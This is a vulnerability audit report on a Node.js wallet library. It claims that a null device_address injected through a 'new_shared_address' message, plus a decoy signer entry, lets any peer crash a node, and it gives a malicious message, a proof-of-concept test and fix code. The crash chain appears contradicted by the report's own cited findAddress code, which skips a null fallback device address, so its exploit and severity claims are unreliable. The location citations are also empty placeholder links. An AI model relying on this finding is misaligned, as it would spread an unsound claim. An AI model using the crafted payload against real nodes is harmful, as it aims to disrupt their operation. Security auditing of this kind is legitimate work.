# Audit Report: Null Device Address Injection Causes Node Crash in Shared Address Operations

## Title
Unvalidated Device Address in Shared Address Messages Enables Remote Node Crash via Exception in Message Routing

## Summary
The `handleNewSharedAddress()` function in `wallet_defined_by_addresses.js` fails to validate the `device_address` field in received shared address signer information, allowing malicious peers to inject null/undefined values. By including a decoy entry with the victim's device address, attackers bypass defensive rewrite logic, causing null device addresses to persist in the database. When signing requests are later processed for these addresses, the code attempts to route messages to null device addresses, triggering an uncaught synchronous exception in `sendMessageToDevice()` that crashes the node.

## Impact
**Severity**: Medium  
**Category**: Temporary Transaction Delay / Node Crash DoS

The vulnerability enables any untrusted peer to crash victim nodes through a simple two-message sequence. Affected nodes require manual restart, and the corrupted data persists in the database, allowing repeated crashes until manually cleaned. This disrupts shared address operations and prevents nodes from processing transactions.

## Finding Description

**Location**: 
- Primary: [1](#0-0) 
- Rewrite logic: [2](#0-1) 
- Storage: [3](#0-2) 
- Crash trigger: [4](#0-3) 
- Exception: [5](#0-4) 

**Intended Logic**: When receiving a "new_shared_address" message from a peer, the system should validate all signer information including device addresses, rewrite device addresses for entries referencing local payment addresses, and safely store the data. Later operations should route signing requests to valid correspondent device addresses.

**Actual Logic**: 

1. **Missing Validation**: The validation loop only checks `signerInfo.address` but completely ignores `signerInfo.device_address`: [6](#0-5) 

2. **Bypassable Rewrite Logic**: The protective rewrite only executes when `!bHasMyDeviceAddress`. An attacker can set this flag by including a decoy entry with the victim's device address: [7](#0-6) 

3. **Unsafe Database Storage**: Null device addresses are inserted directly into `shared_address_signing_paths` without validation: [8](#0-7) 

4. **Crash Trigger Path**: When a signing request arrives, `findAddress()` queries the database, retrieves the null device address, and eventually passes it to the `ifRemote` callback: [9](#0-8)  then [10](#0-9) 

5. **Uncaught Exception**: The `ifRemote` callback invokes `sendMessageToDevice(null, ...)` [11](#0-10) , which throws synchronously [12](#0-11) . No try-catch exists in the message handler [13](#0-12) , causing the Node.js process to crash.

**Exploitation Path**:

1. **Preconditions**: 
   - Victim node accepts peer connections
   - Attacker knows victim's device address and at least one payment address (publicly observable)

2. **Step 1 - Inject Malicious Data**: 
   - Attacker sends "new_shared_address" message via [14](#0-13) 
   - Message contains: `{signers: {'r.0': {address: 'VICTIM_PAYMENT_ADDRESS', device_address: null}, 'r.1': {address: 'ATTACKER_ADDRESS', device_address: 'VICTIM_DEVICE_ADDRESS'}}}`
   - Entry 'r.1' is a decoy that sets `bHasMyDeviceAddress = true`, preventing rewrite of entry 'r.0'

3. **Step 2 - Database Corruption**: 
   - Validation passes because only `address` field is checked
   - `determineIfIncludesMeAndRewriteDeviceAddress()` accepts the data because victim's address is found
   - Null device_address for 'r.0' is stored in database

4. **Step 3 - Trigger Crash**:
   - Attacker (or any party) sends "sign" message requesting signature at path 'r.0' [15](#0-14) 
   - `findAddress()` queries database and retrieves null device_address
   - Code attempts to forward signing request to null device_address
   - `sendMessageToDevice(null, ...)` throws "empty device address" error
   - Exception is uncaught in message handler, crashing Node.js process

**Security Property Broken**: Node availability and message routing integrity. The system should never attempt to send messages to invalid device addresses, and should handle all peer-supplied data defensively.

**Root Cause Analysis**:
- **Incomplete Input Validation**: `handleNewSharedAddress()` validates only addresses, not device addresses
- **Bypassable Safety Mechanism**: Rewrite logic can be circumvented with attacker-controlled decoy entries  
- **Missing Database Constraints**: No NOT NULL constraint on `device_address` column
- **Synchronous Exception in Async Context**: Throw propagates uncaught through callback chain

## Impact Explanation

**Affected Assets**: Node availability, shared address operations, transaction processing capability

**Damage Severity**:
- **Quantitative**: Single malicious message pair can crash any node repeatedly. Each crash requires manual intervention. Corrupted database entry persists indefinitely until manually removed.
- **Qualitative**: Complete denial of service for targeted nodes. Disrupts shared address coordination. Automated systems become unreliable.

**User Impact**:
- **Who**: Any node accepting peer connections and using shared addresses
- **Conditions**: Node receives malicious "new_shared_address" message containing victim's payment address; later receives signing request for that path
- **Recovery**: Requires node restart after each crash, plus manual database cleanup to remove corrupted entries

**Systemic Risk**: If multiple nodes in a multi-signature address configuration are targeted, coordination becomes impossible. Network resilience is compromised if many nodes are repeatedly crashed.

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Any untrusted peer on network
- **Resources Required**: Ability to send P2P messages; knowledge of victim's device address and payment address (both publicly observable from on-chain activity)
- **Technical Skill**: Low - requires only crafting two simple JSON messages

**Preconditions**:
- **Network State**: Normal operation with peer connections enabled
- **Attacker State**: Connected as correspondent or able to relay via hub
- **Timing**: No timing constraints; attacker fully controls both messages

**Execution Complexity**:
- **Transaction Count**: Two messages (new_shared_address, then sign)
- **Coordination**: None required - single attacker controls entire sequence
- **Detection Risk**: Low - appears as normal shared address creation until crash

**Frequency**:
- **Repeatability**: Unlimited - can repeat on every restart since corrupted data persists
- **Scale**: Can target multiple nodes simultaneously with different addresses

**Overall Assessment**: **High likelihood** - trivially exploitable by any peer with no economic barrier or technical sophistication required.

## Recommendation

**Immediate Mitigation**:
Add validation for `device_address` field in `handleNewSharedAddress()`:

```javascript
// In wallet_defined_by_addresses.js, after line 348
for (var signing_path in body.signers){
    var signerInfo = body.signers[signing_path];
    if (signerInfo.address && signerInfo.address !== 'secret' && !ValidationUtils.isValidAddress(signerInfo.address))
        return callbacks.ifError("invalid member address: "+signerInfo.address);
    // ADD THIS:
    if (signerInfo.device_address && !ValidationUtils.isValidDeviceAddress(signerInfo.device_address))
        return callbacks.ifError("invalid device address: "+signerInfo.device_address);
}
```

**Permanent Fix**:
1. Add database constraint: `ALTER TABLE shared_address_signing_paths ADD CONSTRAINT CHECK (device_address IS NOT NULL)`
2. Add defensive null check before message routing in findAddress()
3. Wrap message handler in try-catch to prevent process crashes

**Additional Measures**:
- Add test case verifying rejection of null device addresses in shared address messages
- Add database migration to clean up any existing corrupted entries
- Add logging/monitoring for null device address attempts

**Validation**:
- [ ] Fix rejects messages with null/undefined/empty device addresses
- [ ] Existing valid shared addresses continue to function
- [ ] No new attack vectors introduced

## Proof of Concept

```javascript
// test/null_device_address_dos.test.js
const device = require('../device.js');
const wallet = require('../wallet.js');
const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
const db = require('../db.js');
const objectHash = require('../object_hash.js');

describe('Null Device Address DoS', function() {
    this.timeout(5000);
    
    before(function(done) {
        // Initialize test database and victim node
        db.executeInTransaction(function(conn, onDone) {
            // Create victim's payment address
            conn.query(
                "INSERT INTO my_addresses (address, wallet, is_change, address_index) VALUES (?,?,?,?)",
                ['VICTIM_PAYMENT_ADDR', 'test_wallet', 0, 0],
                onDone
            );
        }, done);
    });
    
    it('should crash node when processing signing request with null device address', function(done) {
        // Step 1: Inject malicious shared address
        const maliciousMessage = {
            address: objectHash.getChash160(['sig', {pubkey: 'dummy'}]),
            definition: ['sig', {pubkey: 'dummy'}],
            signers: {
                'r.0': {
                    address: 'VICTIM_PAYMENT_ADDR',
                    device_address: null,  // Malicious null value
                    member_signing_path: 'r'
                },
                'r.1': {
                    address: 'ATTACKER_ADDR',
                    device_address: device.getMyDeviceAddress(),  // Decoy to bypass rewrite
                    member_signing_path: 'r'
                }
            }
        };
        
        walletDefinedByAddresses.handleNewSharedAddress(maliciousMessage, {
            ifError: function(err) {
                done(new Error('Should not reject: ' + err));
            },
            ifOk: function() {
                // Step 2: Verify null device address was stored
                db.query(
                    "SELECT device_address FROM shared_address_signing_paths WHERE signing_path='r.0'",
                    [],
                    function(rows) {
                        if (rows.length === 0) return done(new Error('Entry not found'));
                        if (rows[0].device_address !== null) return done(new Error('Expected null device_address'));
                        
                        // Step 3: Trigger crash via signing request
                        process.once('uncaughtException', function(err) {
                            // Expected: "empty device address" error crashes node
                            if (err.message.includes('empty device address')) {
                                console.log('✓ Node crashed as expected with:', err.message);
                                done();
                            } else {
                                done(new Error('Unexpected error: ' + err.message));
                            }
                        });
                        
                        // Send signing request that will trigger crash
                        const signingRequest = {
                            address: maliciousMessage.address,
                            signing_path: 'r.0',
                            unsigned_unit: {
                                version: '1.0',
                                authors: [{address: maliciousMessage.address, authentifiers: {'r': '-'}}],
                                messages: []
                            }
                        };
                        
                        wallet.handleMessageFromHub(null, {
                            subject: 'sign',
                            body: signingRequest
                        }, 'dummy_pubkey', false, {
                            ifOk: function() {},
                            ifError: function() {}
                        });
                    }
                );
            }
        });
    });
});
```

## Notes

This vulnerability represents a critical oversight in peer message validation. The validation logic correctly checks payment addresses but completely ignores device addresses, which are equally critical for message routing. The rewrite mechanism, intended as a safety feature, can be trivially bypassed by an attacker who includes their own decoy entry.

The crash occurs because `sendMessageToDevice()` uses a synchronous `throw` statement rather than passing errors through callbacks, and no try-catch wrapper exists in the message handling path. This represents a common anti-pattern in Node.js async code where synchronous exceptions can escape callback chains.

The persistence of corrupted data in the database makes this particularly severe - a single malicious message can cause indefinite repeated crashes until the database is manually cleaned.

### Citations

**File:** wallet_defined_by_addresses.js (L239-268)
```javascript
function addNewSharedAddress(address, arrDefinition, assocSignersByPath, bForwarded, onDone){
//	network.addWatchedAddress(address);
	db.query(
		"INSERT "+db.getIgnore()+" INTO shared_addresses (shared_address, definition) VALUES (?,?)", 
		[address, JSON.stringify(arrDefinition)], 
		function(){
			var arrQueries = [];
			for (var signing_path in assocSignersByPath){
				var signerInfo = assocSignersByPath[signing_path];
				db.addQuery(arrQueries, 
					"INSERT "+db.getIgnore()+" INTO shared_address_signing_paths \n\
					(shared_address, address, signing_path, member_signing_path, device_address) VALUES (?,?,?,?,?)", 
					[address, signerInfo.address, signing_path, signerInfo.member_signing_path, signerInfo.device_address]);
			}
			async.series(arrQueries, function(){
				console.log('added new shared address '+address);
				eventBus.emit("new_address-"+address);
				eventBus.emit("new_address", address);

				if (conf.bLight){
					db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address], onDone);
				} else if (onDone)
					onDone();
				if (!bForwarded)
					forwardNewSharedAddressToCosignersOfMyMemberAddresses(address, arrDefinition, assocSignersByPath);
			
			});
		}
	);
}
```

**File:** wallet_defined_by_addresses.js (L281-315)
```javascript
function determineIfIncludesMeAndRewriteDeviceAddress(assocSignersByPath, handleResult){
	var assocMemberAddresses = {};
	var bHasMyDeviceAddress = false;
	for (var signing_path in assocSignersByPath){
		var signerInfo = assocSignersByPath[signing_path];
		if (signerInfo.device_address === device.getMyDeviceAddress())
			bHasMyDeviceAddress = true;
		if (signerInfo.address)
			assocMemberAddresses[signerInfo.address] = true;
	}
	var arrMemberAddresses = Object.keys(assocMemberAddresses);
	if (arrMemberAddresses.length === 0)
		return handleResult("no member addresses?");
	db.query(
		"SELECT address, 'my' AS type FROM my_addresses WHERE address IN(?) \n\
		UNION \n\
		SELECT shared_address AS address, 'shared' AS type FROM shared_addresses WHERE shared_address IN(?)", 
		[arrMemberAddresses, arrMemberAddresses],
		function(rows){
		//	handleResult(rows.length === arrMyMemberAddresses.length ? null : "Some of my member addresses not found");
			if (rows.length === 0)
				return handleResult("I am not a member of this shared address");
			var arrMyMemberAddresses = rows.filter(function(row){ return (row.type === 'my'); }).map(function(row){ return row.address; });
			// rewrite device address for my addresses
			if (!bHasMyDeviceAddress){
				for (var signing_path in assocSignersByPath){
					var signerInfo = assocSignersByPath[signing_path];
					if (signerInfo.address && arrMyMemberAddresses.indexOf(signerInfo.address) >= 0)
						signerInfo.device_address = device.getMyDeviceAddress();
				}
			}
			handleResult();
		}
	);
}
```

**File:** wallet_defined_by_addresses.js (L338-360)
```javascript
// {address: "BASE32", definition: [...], signers: {...}}
function handleNewSharedAddress(body, callbacks){
	if (!ValidationUtils.isArrayOfLength(body.definition, 2))
		return callbacks.ifError("invalid definition");
	if (typeof body.signers !== "object" || Object.keys(body.signers).length === 0)
		return callbacks.ifError("invalid signers");
	if (body.address !== objectHash.getChash160(body.definition))
		return callbacks.ifError("definition doesn't match its c-hash");
	for (var signing_path in body.signers){
		var signerInfo = body.signers[signing_path];
		if (signerInfo.address && signerInfo.address !== 'secret' && !ValidationUtils.isValidAddress(signerInfo.address))
			return callbacks.ifError("invalid member address: "+signerInfo.address);
	}
	determineIfIncludesMeAndRewriteDeviceAddress(body.signers, function(err){
		if (err)
			return callbacks.ifError(err);
		validateAddressDefinition(body.definition, function(err){
			if (err)
				return callbacks.ifError(err);
			addNewSharedAddress(body.address, body.definition, body.signers, body.forwarded, callbacks.ifOk);
		});
	});
}
```

**File:** wallet.js (L60-77)
```javascript
function handleMessageFromHub(ws, json, device_pubkey, bIndirectCorrespondent, callbacks){
	// serialize all messages from hub
	mutex.lock(["from_hub"], function(unlock){
		var oldcb = callbacks;
		callbacks = {
			ifOk: function(){oldcb.ifOk(); unlock();},
			ifError: function(err){oldcb.ifError(err); unlock();}
		};

		var subject = json.subject;
		var body = json.body;
		if (!subject || typeof body == "undefined")
			return callbacks.ifError("no subject or body");
		//if (bIndirectCorrespondent && ["cancel_new_wallet", "my_xpubkey", "new_wallet_address"].indexOf(subject) === -1)
		//    return callbacks.ifError("you're indirect correspondent, cannot trust "+subject+" from you");
		var from_address = objectHash.getDeviceAddress(device_pubkey);
		
		switch (subject){
```

**File:** wallet.js (L212-220)
```javascript
			case "new_shared_address":
				// {address: "BASE32", definition: [...], signers: {...}}
				walletDefinedByAddresses.handleNewSharedAddress(body, {
					ifError: callbacks.ifError,
					ifOk: function(){
						callbacks.ifOk();
						eventBus.emit('maybe_new_transactions');
					}
				});
```

**File:** wallet.js (L227-295)
```javascript
			case "sign":
				// {address: "BASE32", signing_path: "r.1.2.3", unsigned_unit: {...}}
				if (!ValidationUtils.isValidAddress(body.address))
					return callbacks.ifError("no address or bad address");
				if (!ValidationUtils.isNonemptyString(body.signing_path) || body.signing_path.charAt(0) !== 'r')
					return callbacks.ifError("bad signing path");
				var objUnit = body.unsigned_unit;
				if (typeof objUnit !== "object")
					return callbacks.ifError("no unsigned unit");
				if (!ValidationUtils.isNonemptyArray(objUnit.authors))
					return callbacks.ifError("no authors array");
				var bJsonBased = (objUnit.version !== constants.versionWithoutTimestamp);
				// replace all existing signatures with placeholders so that signing requests sent to us on different stages of signing become identical,
				// hence the hashes of such unsigned units are also identical
				objUnit.authors.forEach(function(author){
					var authentifiers = author.authentifiers;
					for (var path in authentifiers)
						authentifiers[path] = authentifiers[path].replace(/./, '-'); 
				});
				var assocPrivatePayloads = body.private_payloads;
				if ("private_payloads" in body){
					if (typeof assocPrivatePayloads !== "object" || !assocPrivatePayloads)
						return callbacks.ifError("bad private payloads");
					for (var payload_hash in assocPrivatePayloads){
						var payload = assocPrivatePayloads[payload_hash];
						var hidden_payload = _.cloneDeep(payload);
						if (payload.denomination) // indivisible asset.  In this case, payload hash is calculated based on output_hash rather than address and blinding
							hidden_payload.outputs.forEach(function(o){
								delete o.address;
								delete o.blinding;
							});
						try {
							var calculated_payload_hash = objectHash.getBase64Hash(hidden_payload, bJsonBased);
						}
						catch (e) {
							return callbacks.ifError("hidden payload hash failed: " + e.toString());
						}
						if (payload_hash !== calculated_payload_hash)
							return callbacks.ifError("private payload hash does not match");
						if (!ValidationUtils.isNonemptyArray(objUnit.messages))
							return callbacks.ifError("no messages in unsigned unit");
						if (objUnit.messages.filter(function(objMessage){ return (objMessage.payload_hash === payload_hash); }).length !== 1)
							return callbacks.ifError("no such payload hash in the messages");
					}
				}
				if (objUnit.messages){
					var arrMessages = objUnit.messages;
					if (!Array.isArray(arrMessages))
						return callbacks.ifError("bad type of messages");
					for (var i=0; i<arrMessages.length; i++){
						if (arrMessages[i].payload === undefined)
							continue;
						try {
							var calculated_payload_hash = objectHash.getBase64Hash(arrMessages[i].payload, bJsonBased);
						}
						catch (e) {
							return callbacks.ifError("payload hash failed: " + e.toString());
						}
						if (arrMessages[i].payload_hash !== calculated_payload_hash)
							return callbacks.ifError("payload hash does not match");
					}
				}
				else if (objUnit.signed_message){
					// ok
				}
				else
					return callbacks.ifError("neither messages nor signed_message");
				// findAddress handles both types of addresses
				findAddress(body.address, body.signing_path, {
```

**File:** wallet.js (L352-353)
```javascript
						// forward the offer to the actual signer
						device.sendMessageToDevice(device_address, subject, body);
```

**File:** wallet.js (L1027-1096)
```javascript
function findAddress(address, signing_path, callbacks, fallback_remote_device_address){
	db.query(
		"SELECT wallet, account, is_change, address_index, full_approval_date, device_address \n\
		FROM my_addresses JOIN wallets USING(wallet) JOIN wallet_signing_paths USING(wallet) \n\
		WHERE address=? AND signing_path=?",
		[address, signing_path],
		function(rows){
			if (rows.length > 1)
				throw Error("more than 1 address found");
			if (rows.length === 1){
				var row = rows[0];
				if (!row.full_approval_date)
					return callbacks.ifError("wallet of address "+address+" not approved");
				if (row.device_address !== device.getMyDeviceAddress())
					return callbacks.ifRemote(row.device_address);
				var objAddress = {
					address: address,
					wallet: row.wallet,
					account: row.account,
					is_change: row.is_change,
					address_index: row.address_index
				};
				callbacks.ifLocal(objAddress);
				return;
			}
			db.query(
			//	"SELECT address, device_address, member_signing_path FROM shared_address_signing_paths WHERE shared_address=? AND signing_path=?", 
				// look for a prefix of the requested signing_path
				"SELECT address, device_address, signing_path FROM shared_address_signing_paths \n\
				WHERE shared_address=? AND signing_path=SUBSTR(?, 1, LENGTH(signing_path))", 
				[address, signing_path],
				function(sa_rows){
					if (sa_rows.length > 1)
						throw Error("more than 1 member address found for shared address "+address+" and signing path "+signing_path);
					if (sa_rows.length === 1) {
						var objSharedAddress = sa_rows[0];
						var relative_signing_path = 'r' + signing_path.substr(objSharedAddress.signing_path.length);
						var bLocal = (objSharedAddress.device_address === device.getMyDeviceAddress()); // local keys
						if (objSharedAddress.address === '') {
							return callbacks.ifMerkle(bLocal);
						} else if(objSharedAddress.address === 'secret') {
							return callbacks.ifSecret();
						}
						return findAddress(objSharedAddress.address, relative_signing_path, callbacks, bLocal ? null : objSharedAddress.device_address);
					}
					db.query(
						"SELECT device_address, signing_paths FROM peer_addresses WHERE address=?", 
						[address],
						function(pa_rows) {
							var candidate_addresses = [];
							for (var i = 0; i < pa_rows.length; i++) {
								var row = pa_rows[i];
								JSON.parse(row.signing_paths).forEach(function(signing_path_candidate){
									if (signing_path_candidate === signing_path)
										candidate_addresses.push(row.device_address);
								});
							}
							if (candidate_addresses.length > 1)
								throw Error("more than 1 candidate device address found for peer address "+address+" and signing path "+signing_path);
							if (candidate_addresses.length == 1)
								return callbacks.ifRemote(candidate_addresses[0]);
							if (fallback_remote_device_address)
								return callbacks.ifRemote(fallback_remote_device_address);
							return callbacks.ifUnknownAddress();
						}
					);
				}
			);
		}
	);
```

**File:** device.js (L702-704)
```javascript
function sendMessageToDevice(device_address, subject, body, callbacks, conn){
	if (!device_address)
		throw Error("empty device address");
```
